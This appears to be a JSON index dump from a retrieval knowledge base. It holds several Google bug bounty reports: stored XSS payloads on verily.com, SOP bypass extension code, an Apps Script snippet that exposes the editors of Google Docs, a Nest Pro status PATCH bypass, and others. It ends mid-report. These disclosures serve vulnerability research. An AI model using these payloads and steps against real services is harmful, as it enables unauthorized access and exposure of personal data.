"text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5d0213906fa8aa251e01ffdbad56b24fa3be4c6f7c42be85f0c31fced554957a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e1615abc-b123-4737-af6f-30bfba8262b2": {"__data__": {"id_": "e1615abc-b123-4737-af6f-30bfba8262b2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.clean.txt", "file_name": "20250408_175715_093489.clean.txt", "file_type": "text/plain", "file_size": 564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f9bd4c02-0b26-43a8-bbe2-3d19457d3803", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.clean.txt", "file_name": "20250408_175715_093489.clean.txt", "file_type": "text/plain", "file_size": 564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "55c92a34918fa13a804222c65c63fd61d95932469ca490f6c079e8693cbf25be", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Improper Implementation Of Web Application Access Conrol On script.google.com\r\nSteps to reproduce:\r\nDeploy New App With Access Control  \"Anyone Google Account\" And Copy-Paste The URL To The Incognito Tab Of The Browser Logged In WIth Different Google Account\r\nNow Update The Deployment With Access Control 'Only Myself' And Again Open The App With Different Google Account In Incognito Tab Or Another Browser, The App Is Still Accessible\r\nPoC :-\r\nhttps://youtu.be/q3-i4XY8hJE\r\nAttack scenario:\r\nAnyone Can Access Privately The Deployed With Google Account", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 564, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cc478652-75b0-4fb3-88db-86d0a1c5cfee": {"__data__": {"id_": "cc478652-75b0-4fb3-88db-86d0a1c5cfee", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.clean.txt", "file_name": "20250408_175652_047181.clean.txt", "file_type": "text/plain", "file_size": 763, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e48968b8-5520-41c0-88b0-81e078df740e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.clean.txt", "file_name": "20250408_175652_047181.clean.txt", "file_type": "text/plain", "file_size": 763, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "6808096456010937186ed19e4b6dc5a3a06a6d98f6db76c06eef718dd7203dc5", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSOP bypass via AMP Readiness Tool\r\nProduct:\r\nAMP Readiness Tool\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/amp-readiness-tool/fadclbipdhchagpdkjfcpippejnekimg\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled site run:\r\nwindow.onclick = () => {\r\nopen('https://www.google.com');\r\nsetTimeout(() => {\r\nchrome.runtime.sendMessage({id: 'get_apps', tab: {id: ''}}, e => {console.log(e.html)})\r\n}, 3000);\r\n}\r\nClick on the page and the console should log the victims html.\r\nAttack scenario\r\nA compromised renderer can bypass the SOP via the AMP Readiness Tool\r\nExtension contact:\r\namp-readiness-tool-admin@google.com\r\nI'm aware this bug is boring.\r\nDone as part of Grant issue 286169438", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 763, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "6bb31a68-66a7-4ea8-8c7e-8d6feaa98980": {"__data__": {"id_": "6bb31a68-66a7-4ea8-8c7e-8d6feaa98980", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.clean.txt", "file_name": "20250408_175717_202124.clean.txt", "file_type": "text/plain", "file_size": 3339, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "16bb39a7-c794-4fed-a457-54a7d57858b2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.clean.txt", "file_name": "20250408_175717_202124.clean.txt", "file_type": "text/plain", "file_size": 3339, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a2e4ec8337751cad4a99446d97b31b3ad90c0447f6af8e8e3a95770e968e922b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Bug that make possible massive data leak (over 100 million Google users)\r\nVideo with explanation and steps to reproduce:\r\nhttps://youtu.be/WBirMTa5JH0\r\nSteps:\r\nHave a Google Analytics with data from real users\r\nUse some cleaver advanced filtering strategy explained in the video\r\nJoin the Google profile data leaked (gender, age, interests) with the real person by using some other id (transaction id, site user id, newsletter id, ...)\r\nCollect it for all the site users by using Python and Google Analytics API\r\nI tested it with my devices and my Google accounts and the data I was able to leak about my self was correct.\r\nThis was the data I was able to get about my browser without the need to be logged in Google as myself:\r\nGender: male\r\nAge: 35-44\r\n------- Interests -------\r\nAutos & Vehicles/Motor Vehicles (By Brand)/Honda\r\nAutos & Vehicles/Vehicle Shopping/Used Vehicles\r\nComputers & Electronics/Computer Hardware/Computer Peripherals/Computer Monitors & Displays\r\nComputers & Electronics/Computer Hardware/Laptops & Notebooks\r\nComputers & Electronics/Programming/Development Tools\r\nComputers & Electronics/Programming/Java (Programming Language)\r\nComputers & Electronics/Programming/Scripting Languages\r\nInternet & Telecom/Email & Messaging/Email\r\nInternet & Telecom/Web Services/Web Design & Development\r\nShopping/Classifieds\r\n------- Affinity Category -------\r\nBanking & Finance/Avid Investors\r\nFood & Dining/Frequently Dines Out/Diners by Meal/Frequently Eats Dinner Out\r\nFood & Dining/Frequently Dines Out/Diners by Meal/Frequently Eats Lunch Out\r\nHome & Garden/Do-It-Yourselfers\r\nLifestyles & Hobbies/Business Professionals\r\nLifestyles & Hobbies/Outdoor Enthusiasts\r\nMedia & Entertainment/Light TV Viewers\r\nMedia & Entertainment/Movie Lovers\r\nShoppers/Value Shoppers\r\nTechnology/Mobile Enthusiasts\r\nTechnology/Technophiles\r\nTravel/Business Travelers\r\nTravel/Travel Buffs\r\n------- In-Market Segment -------\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles (New)\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles (Used)\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Brand/Chevrolet\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Brand/Honda\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Type/Hatchbacks\r\nBeauty & Personal Care\r\nBeauty & Personal Care/Makeup & Cosmetics\r\nBusiness Services/Business Technology/Enterprise Software/ERP Solutions\r\nBusiness Services/Business Technology/Web Services\r\nBusiness Services/Business Technology/Web Services/Web Design & Development\r\nComputers & Peripherals/Computer Accessories & Components\r\nComputers & Peripherals/Computer Accessories & Components/Computer Monitors\r\nComputers & Peripherals/Computers\r\nComputers & Peripherals/Computers/Laptops & Notebooks\r\nEducation/Post-Secondary Education\r\nEducation/Test Preparation & Tutoring\r\nEmployment/IT & Technical Jobs\r\nHome & Garden/Home Improvement/Tools\r\nReal Estate/Residential Properties\r\nSoftware/Business & Productivity Software\r\nAttack scenario:\r\nExample 1) An Ecommerce can extract the Google profile (gender, age, interests) of the site visitors and join it to their CRM (Full Name, Email, ...).\r\nExample 2) Some hacker could send the victim a link with one unique id in the url and just by opening this url for at least 3 seconds the hacker would be able to know their Google profile (gender, age, interests).", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3339, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "01a27fd4-d864-4b12-9216-2bd12b2a7092": {"__data__": {"id_": "01a27fd4-d864-4b12-9216-2bd12b2a7092", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.clean.txt", "file_name": "20250408_175656_491339.clean.txt", "file_type": "text/plain", "file_size": 1359, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cca3e6f0-0eab-4499-a295-398b7fddc898", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.clean.txt", "file_name": "20250408_175656_491339.clean.txt", "file_type": "text/plain", "file_size": 1359, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "dfc8dd6f499c4c024a7499d5f8492ba60cc4bf160342737dba7d90452721c3fc", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nStored XSS on\r\nhttps://identity-dev.api.verily.com/\r\nProduct:\r\nverily.com\r\nURL:\r\nhttps://identity-dev.api.verily.com\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nWhile testing verily.com subdomains i came across domain\r\nwhich is used for authentication and identity verification. I found Stored XSS on this domain.\r\nI have found this stored XSS in 2 different domains .\r\nDescription :\r\nWhen you go to\r\nhttps://ciam-email-verification.api.verily.com\r\nand authenticate yourself , you will see option of \"Unverify your email\" . When you click on it , It will send a request in background which looks like below.\r\nhttps://identity-dev.api.verily.com/UnverifyEmail?id=ciam%3Av1%3Aauth0%7C643daac39c44a90a5eefbe48&return=%2F\r\nHere \"return\" post parameter is vulnerable to XSS Attack.\r\nPayload used :\r\njavascript:alert(document.domain)\r\nVulnerable Domains :\r\nhttps://identity-playground.api.verily.com\r\nFinal Stored XSS POC :\r\nhttps://identity-dev.api.verily.com/UnverifyEmail?id=ciam%3Av1%3Aauth0%7C643daac39c44a90a5eefbe48&return=javascript:alert(document.domain)\r\nSame works on domain\r\ntoo.\r\nhttps://identity-playground.api.verily.com/UnverifyEmail?id=ciam%3av1%3aauth0%7c642521a63d40e99271e1c97d&return=javascript:alert(document.domain)\r\nBoth the XSS works on both Authenticated and Unauthenticated Accounts.\r\nAttack scenario\r\nStored XSS.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1359, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "691efd08-5dc9-4a65-8224-b47fd03757a5": {"__data__": {"id_": "691efd08-5dc9-4a65-8224-b47fd03757a5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.clean.txt", "file_name": "20250408_175733_300028.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "515a14af-2f83-4fd2-94db-5b2f45552c80", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.clean.txt", "file_name": "20250408_175733_300028.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "df57bcd96b45680264ab7155e56072b05024bb41e5ff6960e45c415e44c55ede", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "5b2fddbf-0e6f-40a9-a7d4-3ef28a61df16": {"__data__": {"id_": "5b2fddbf-0e6f-40a9-a7d4-3ef28a61df16", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.clean.txt", "file_name": "20250408_175726_398236.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "429e5a9e-f193-49eb-8a6f-9891ba90c94f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.clean.txt", "file_name": "20250408_175726_398236.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "0675b5f557042aa0627a522402654fc35822e65ec4966c7925c563ff3f50e475", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c9ad628d-fc37-4b48-b6bb-5a9f6cf43880": {"__data__": {"id_": "c9ad628d-fc37-4b48-b6bb-5a9f6cf43880", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.clean.txt", "file_name": "20250408_175724_116621.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c977429e-9ff4-447a-9579-fbcd3b66aee3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.clean.txt", "file_name": "20250408_175724_116621.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b093f4e5253814e928d5b9fc37c079daadcfe90223b5172b75ab927a178a8bbe", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7912be38-fbb7-4550-a247-22394fa545b9": {"__data__": {"id_": "7912be38-fbb7-4550-a247-22394fa545b9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.clean.txt", "file_name": "20250408_175642_691964.clean.txt", "file_type": "text/plain", "file_size": 1034, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b5197005-4e01-4bc3-b3cf-67fb4fbb9cb5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.clean.txt", "file_name": "20250408_175642_691964.clean.txt", "file_type": "text/plain", "file_size": 1034, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9e4dbf41927c4f897b645ca66fd3dfdce255fc6f53417a2a100addcd6696370a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nFaceviewer wrongly trusting gstatic.com\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nCreate this link replacing <xss> with a url reflected xss of\r\n*.gstatic.com\r\n<a href=\"faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://ssl.gstatic.com/<xss>\">tap</a>\r\nCreate a test app with a non-browsable intent for example.\r\n<intent-filter>\r\n<action android:name=\"android.intent.action.VIEW\" />\r\n<category android:name=\"android.intent.category.DEFAULT\" />\r\n<data android:scheme=\"testintent\" />\r\n</intent-filter>\r\nFrom the top level gstatic page run the following.\r\nfaceViewerWebXBridge.postMessage(JSON.stringify({cmd: btoa(':\\x0F\\n\\rtestintent://')}));\r\nAttack scenario\r\nAn attacker can abuse bugs in non-web exposed android intents from the web.\r\nWhile this does need a xss on gstatic, this is not considered a security issue so (hopefully) I can assume it exists. (postMessage one does not sure about url)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1034, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "55301459-8c97-4114-a08f-ee6548454ec2": {"__data__": {"id_": "55301459-8c97-4114-a08f-ee6548454ec2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.clean.txt", "file_name": "20250408_175724_226922.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "314774b2-2445-46f2-a948-3bcffe227cc9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.clean.txt", "file_name": "20250408_175724_226922.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "352b04319d6c2a22694847e8f109965b2c267c3e705edf7f49c88b556090dcec", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ef6e7f81-cee3-4830-8259-cf9763420e74": {"__data__": {"id_": "ef6e7f81-cee3-4830-8259-cf9763420e74", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.clean.txt", "file_name": "20250408_172348_873880.clean.txt", "file_type": "text/plain", "file_size": 3067, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c57bf029-dd98-4f3b-bc14-9f2a3d33faed", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.clean.txt", "file_name": "20250408_172348_873880.clean.txt", "file_type": "text/plain", "file_size": 3067, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "61dc7322467731bf90ec6bc57d34770fe826e004eb57b4a4d0d693e78e699648", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nLoophole to see the editors of a Google Document with no granted access(owner/editor) with just the fileid ( can be obtained from publicly shared links with 0 access )\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/document/d/1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nNote: I have gone though\r\nhttps://bughunters.google.com/learn/invalid-reports/5374985771941888\r\nand would like to first say counter to any possible confusions For\r\nhttps://bughunters.google.com/learn/invalid-reports/google-products/4983708328919040/ability-to-map-email-addresses-to-profile-names\r\n, I want to say that I am able to get the email addresses when they should not be visible so this is not applicable here\r\nYou can do this with any publicly shared Google Docs Document I am taking this for an example:\r\nScreenshot of exploit attached along with how its not visible in Google Docs UI This was shared to me via a link and i dont have editor/viewer/owner access on my google account The email, username and userloginid of all the editors of this document was not visible via the Webpage opened by the following link But i was able to view the same of all the editors using this loophole\r\nCreate a new Google Docs Document under your google account\r\nOpen Google apps script of that sheet\r\nRun the following code\r\nfunction myFunction() {\r\n// ANY PUBLICLY VISIBLE GOOGLE DOCS DOCUMENT ID\r\nconsole.log(DocumentApp.openById('1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI').getEditors().map(f=>{\r\nreturn Object.keys(f).filter(z=>typeof f[z]=='function').map(key=>[key,f[key]()])\r\n}))\r\n}\r\nYou can replace 1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI with any Document Id of publicly shared Google Docs Document with no access to any editor/owner role granted by email based permission\r\nThe output was\r\n[ [ [ 'toString', '[REDACTED_USERNAME]@gmail.com' ],\r\n[ 'getUsername', '[REDACTED_USERNAME]' ],\r\n[ 'getUserLoginId', '[REDACTED_USERNAME]@gmail.com' ],\r\n[ 'getEmail', '[REDACTED_USERNAME]@gmail.com' ] ],\r\n[ [ 'toString', '[REDACTED_USERNAME]@student.nitw.ac.in' ],\r\n[ 'getUserLoginId', '[REDACTED_USERNAME]@student.nitw.ac.in' ],\r\n[ 'getEmail', '[REDACTED_USERNAME]@student.nitw.ac.in' ] ] ]\r\nThis information is not visible via google drive too, also if you are not an editor, you should clearly not be able to see the email ids of all the editors , so its a clear cut privacy violation\r\nAttack scenario\r\nAnyone can exploit this for any publicly shared Google Docs Document ( They can get the fileid from the link shared ( public viewing link with no access granting by email ) )\r\nThey will be able to get the email, username and userloginid of all the editors of the publicly shared google document even though its not showed in the Google Docs Document UI or Google Drive since the access is not granted explicitly via email address.\r\nThis is clearly a violation of the privacy principle as the details of all the editors are hidden when google Docs Document is shared publicly to protect privacy of the sheet editors", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3067, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d5f23ad1-8cab-4cf4-a870-40f66a2fc906": {"__data__": {"id_": "d5f23ad1-8cab-4cf4-a870-40f66a2fc906", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.clean.txt", "file_name": "20250408_175658_962207.clean.txt", "file_type": "text/plain", "file_size": 3084, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a7ee91ba-dbb2-44b7-97ab-c85c23d52d5f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.clean.txt", "file_name": "20250408_175658_962207.clean.txt", "file_type": "text/plain", "file_size": 3084, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "1113ab747ab72749f76de568dbe065008e42f983180ec23e563619ea693413aa", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nNest Pro Portal API allows bypassing admin verification for self-granted access\r\nProduct:\r\nGoogle Nest Services\r\nURL:\r\nhttps://nest.google.com/pro\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nThe Nest Pro Portal API (\r\nalkalinestproportal-pa.googleapis.com\r\n) has a PATCH method at\r\n/v1/organizations/{organizationId}\r\nthat edits an existing Nest Pro organization provided a JSON object and an update mask. When a user applies for Nest Pro status on behalf of their business, a new organization is created on the server with its\r\nstatus\r\nkey set to\r\nPENDING\r\n. The PATCH method allows a user to set their organization's status to\r\nAPPROVED\r\n, bypassing admin inspection and granting them immediate access to the Nest Pro Portal.\r\nSteps to reproduce:\r\nGo to\r\nand sign in with a Google account.\r\nFill out the application with any information that is required, it doesn't matter what you put in.\r\nBefore accepting the agreement and submitting the application, open the developer tools on your\r\nbrowser to monitor the network traffic.\r\nSubmit the application. You should see a POST request to\r\nhttps://alkalinestproportal-pa.clients6.google.com/batch\r\nwith the request body containing\r\nPOST /v1/organizations\r\n. The page should say \"Your application has been submitted.\" The response will have a JSON object with a\r\nname\r\nkey and a value in the format\r\norganizations/{A random UUID}\r\n. Copy that value.\r\nWrite a script or use a tool to compose a PATCH request of type\r\napplication/json\r\nto\r\nhttps://alkalinestproportal-pa.clients6.google.com/v1/organizations/{that same random UUID, no braces}?key=AIzaSyB0zqBEgW20NpNH9LhRcceIuwVTp8flu-c&alt=json&updateMask=status\r\n. (The API key is lifted from the previous request.)\r\nReuse the\r\nCookie\r\nand\r\nOrigin\r\nheaders from the previous request, and the\r\nAuthorization\r\nheader from the body of the previous request.\r\nSet the body of the PATCH request to\r\n{\"status\": \"APPROVED\"}\r\n.\r\nSend the request.\r\nExpected behavior:\r\nThe server returns an error that the\r\nfield cannot be edited, or returns 200 OK without making any changes.\r\nActual behavior:\r\nThe server returns 200 OK with the body of the response showing\r\nset to\r\n. The user receives an email with the subject line \"Welcome to Google Nest Pro!\"\r\nPoC:\r\norganizations/0bf0c21a-ac86-4e70-b7e3-2490e27d1f86\r\n, Pro ID\r\nD99F66\r\nAttack scenario\r\nThe verification process is in place to ensure that Nest Pros are actually affiliates of the businesses they say, not impersonators, and to check any provided licensure/certification that the Nest Pro may need to install certain devices safely and securely, such as Nest Detect and related security devices, or the Nest x Yale lock.\r\nThis bug would allow a malicious actor to create a Nest Pro organization that impersonates Google or another company, and mark it as certified to install devices that they do not have the qualifications for. It opens up an avenue to abuse user trust in Nest Pro for scam/fraud purposes. Illegitimate members may also try to claim their own devices for rewards or spoof device registrations to rack up credit.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3084, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9ad33a76-0035-4a68-bedc-ff0266a17f31": {"__data__": {"id_": "9ad33a76-0035-4a68-bedc-ff0266a17f31", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.clean.txt", "file_name": "20250408_175710_323925.clean.txt", "file_type": "text/plain", "file_size": 692, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c3d07fd0-5ae9-4e73-952e-847bec0f3c38", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.clean.txt", "file_name": "20250408_175710_323925.clean.txt", "file_type": "text/plain", "file_size": 692, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "123a5df625cfd935a8cdeb10a1713d566e71f82538f4dd1f3bd297e9ff213224", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nWebsite inconstiancy because of malicious code\r\nProduct:\r\nGoogle Transparency Report\r\nURL:\r\nhttps://transparencyreport.google.com/copyright/owners/169376\r\nVulnerability type:\r\nunknown\r\nDetails\r\nif you store such  such script in website ->\r\n\">.txt \"> '> \"> \"> \"onmouseover=\"alert(7); \"onmouseover='prompt(969601)'bad=\">\r\nit trying to execute and after every 1 second page will start up-down and lagging because of this code trying to execute. ( tested in firefox  browser 91.5.0esr 